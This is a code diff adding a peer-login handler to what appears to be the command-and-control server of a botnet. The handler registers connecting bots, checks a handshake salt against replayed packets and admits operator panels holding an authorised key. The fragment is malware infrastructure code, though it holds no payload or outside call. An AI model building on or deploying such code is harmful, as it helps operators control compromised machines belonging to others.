@@ -129,6 +129,42 @@ void laikaC_closeShells(struct sLaika_peer *peer)
 
 /* ================================[[ [Peer] Packet Handlers ]]================================= */
 
+void laikaC_handlePeerLoginReq(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
+    uint8_t saltBuf[LAIKA_HANDSHAKE_SALT_LEN];
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
+    struct sLaika_cnc *cnc = pInfo->cnc;
+    PEERTYPE type;
+    int i;
+
+    /* read packet */
+    type = laikaS_readByte(&peer->sock);
+    laikaS_read(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
+
+    /* make sure the sent salt matches our copy (make sure they're not replaying packets) */
+    if (memcmp(saltBuf, peer->salt, LAIKA_HANDSHAKE_SALT_LEN))
+        LAIKA_ERROR("laikaC_handlePeerHandshake: Salt mismatch!\n");
+
+    switch (type) {
+    case PEER_BOT:
+        laikaC_setPeerType(cnc, peer, PEER_BOT);
+        break;
+    case PEER_AUTH:
+        /* check that peer's pubkey is authenticated */
+        if (!laikaK_checkAuth(peer->peerPub, cnc->authKeys, cnc->authKeysCount))
+            LAIKA_ERROR("laikaC_handlePeerHandshake: Unauthorized panel!\n");
+
+        /* notify cnc */
+        laikaC_setPeerType(cnc, peer, PEER_AUTH);
+        LAIKA_DEBUG("Accepted authenticated panel %p\n", peer);
+        break;
+    default:
+        LAIKA_ERROR("Unknown peerType [%d]!\n", type);
+    }
+
+    LAIKA_DEBUG("Peer login for %p accepted!\n", peer);
+}
+
 void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
 {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
